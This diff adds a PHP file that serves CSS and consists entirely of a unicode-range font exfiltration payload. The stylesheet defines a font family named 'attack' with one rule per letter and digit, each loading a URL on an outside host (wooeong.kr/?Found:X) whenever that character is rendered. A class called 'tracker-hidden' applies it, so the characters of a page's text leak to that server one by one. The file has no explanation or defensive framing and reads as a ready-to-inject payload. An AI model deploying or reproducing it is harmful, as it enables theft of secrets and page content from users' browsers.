@@ -1,0 +1,323 @@
+<?php
+header('Content-Type: text/css');
+header('Access-Control-Allow-Origin: *');
+?>
+<style>
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:A');
+	unicode-range:U+0041;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:B');
+	unicode-range:U+0042;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:C');
+	unicode-range:U+0043;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:D');
+	unicode-range:U+0044;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:E');
+	unicode-range:U+0045;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:F');
+	unicode-range:U+0046;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:G');
+	unicode-range:U+0047;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:H');
+	unicode-range:U+0048;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:I');
+	unicode-range:U+0049;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:J');
+	unicode-range:U+004A;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:K');
+	unicode-range:U+004B;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:L');
+	unicode-range:U+004C;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:M');
+	unicode-range:U+004D;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:N');
+	unicode-range:U+004E;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:O');
+	unicode-range:U+004F;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:P');
+	unicode-range:U+0050;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:Q');
+	unicode-range:U+0051;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:R');
+	unicode-range:U+0052;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:S');
+	unicode-range:U+0053;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:T');
+	unicode-range:U+0054;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:U');
+	unicode-range:U+0055;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:V');
+	unicode-range:U+0056;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:W');
+	unicode-range:U+0057;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:X');
+	unicode-range:U+0058;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:Y');
+	unicode-range:U+0059;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:Z');
+	unicode-range:U+005A;
+}
+
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:a');
+	unicode-range:U+0061;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:b');
+	unicode-range:U+0062;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:c');
+	unicode-range:U+0063;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:d');
+	unicode-range:U+0064;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:e');
+	unicode-range:U+0065;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:f');
+	unicode-range:U+0066;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:g');
+	unicode-range:U+0067;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:h');
+	unicode-range:U+0068;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:i');
+	unicode-range:U+0069;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:j');
+	unicode-range:U+006A;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:k');
+	unicode-range:U+006B;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:l');
+	unicode-range:U+006C;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:m');
+	unicode-range:U+006D;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:n');
+	unicode-range:U+006E;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:o');
+	unicode-range:U+006F;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:p');
+	unicode-range:U+0070;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:q');
+	unicode-range:U+0071;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:r');
+	unicode-range:U+0072;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:s');
+	unicode-range:U+0073;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:t');
+	unicode-range:U+0074;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:u');
+	unicode-range:U+0075;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:v');
+	unicode-range:U+0076;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:w');
+	unicode-range:U+0077;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:x');
+	unicode-range:U+0078;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:y');
+	unicode-range:U+0079;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:z');
+	unicode-range:U+007A;
+}
+
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:0');
+	unicode-range:U+0030;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:1');
+	unicode-range:U+0031;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:2');
+	unicode-range:U+0032;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:3');
+	unicode-range:U+0033;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:4');
+	unicode-range:U+0034;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:5');
+	unicode-range:U+0035;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:6');
+	unicode-range:U+0036;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:7');
+	unicode-range:U+0037;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:8');
+	unicode-range:U+0038;
+}
+@font-face{
+	font-family:attack;
+	src:url('//wooeong.kr/?Found:9');
+	unicode-range:U+0039;
+}
+
+.tracker-hidden{
+	font-family:attack;
+	display: inline;
+}
+</style>
